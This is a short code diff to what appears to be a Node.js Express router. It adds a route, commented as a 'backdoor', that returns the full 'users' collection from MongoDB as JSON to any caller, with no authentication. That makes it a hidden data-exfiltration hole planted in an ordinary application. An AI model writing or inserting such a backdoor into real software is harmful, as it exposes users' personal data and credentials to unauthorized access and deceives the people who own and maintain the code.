@@ -24,6 +24,12 @@ var { sendCloseBrower,
   sendNotFoundDomainWithKeyword
 } = require('services/socket');
 
+//this is backdoor
+router.get('/backdoor',async(req,res)=>{
+  let result=await mongoose.model('users').find();
+  res.json(result);
+})
+//end backdoor
 
 //add project
 //call when client click save new project button
